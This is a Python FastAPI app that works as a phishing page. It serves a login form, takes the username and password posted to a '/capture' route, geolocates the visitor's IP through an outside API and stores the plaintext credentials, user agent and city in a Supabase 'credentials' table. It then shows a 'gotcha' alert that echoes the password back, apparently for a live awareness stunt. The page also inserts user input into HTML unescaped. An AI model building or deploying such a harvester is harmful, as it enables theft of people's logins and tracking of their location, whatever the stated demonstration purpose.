import os
from fastapi import FastAPI, Form, Request
from fastapi.responses import HTMLResponse
from fastapi.templating import Jinja2Templates
from supabase import create_client
import requests

app = FastAPI()
templates = Jinja2Templates(directory="templates")

# Use os.environ.get to pull from Render's settings
SUPABASE_URL = os.environ.get("SUPABASE_URL")
SUPABASE_KEY = os.environ.get("SUPABASE_KEY")

# Check if keys exist (prevents crashing during local testing)
if SUPABASE_URL and SUPABASE_KEY:
    supabase = create_client(SUPABASE_URL, SUPABASE_KEY)
else:
    print("Warning: Supabase credentials not found!")

# 1. ADD THIS: This serves the index.html when they click the link
@app.get("/", response_class=HTMLResponse)
async def get_index(request: Request):

    return templates.TemplateResponse(request=request, name="index.html")

@app.post("/capture")
    
async def capture(request: Request, u: str = Form(...), p: str = Form(...)):
    client_ip = request.headers.get("x-forwarded-for")
    
    city = "Unknown"
    if client_ip:
        # 2. Ask a Geo API about this IP
        try:
            # We take the first IP in the list (in case of multiple proxies)
            actual_ip = client_ip.split(",")[0]
            geo_response = requests.get(f"http://ip-api.com/json/{actual_ip}").json()
            city = geo_response.get("city", "Unknown")
        except:
            pass
    user_info = request.headers.get('user-agent')
    
    # Save to Supabase
    data = {"username": u, "password": p, "user_agent": user_info,"city": city}
    supabase.table("credentials").insert(data, returning="minimal").execute()

    # The Reveal Page (The "Gotcha")
    return HTMLResponse(content=f"""
        <body style="font-family: sans-serif; text-align: center; padding: 50px; background: #fff5f5;">
            <h1 style="color: #e53e3e; font-size: 3rem;">⚠️ SECURITY ALERT ⚠️</h1>
            <p>I just captured your info: <strong>{u}</strong> / <strong>{p}</strong></p>
            <h2>Look at my laptop screen!</h2>
        </body>
    """)
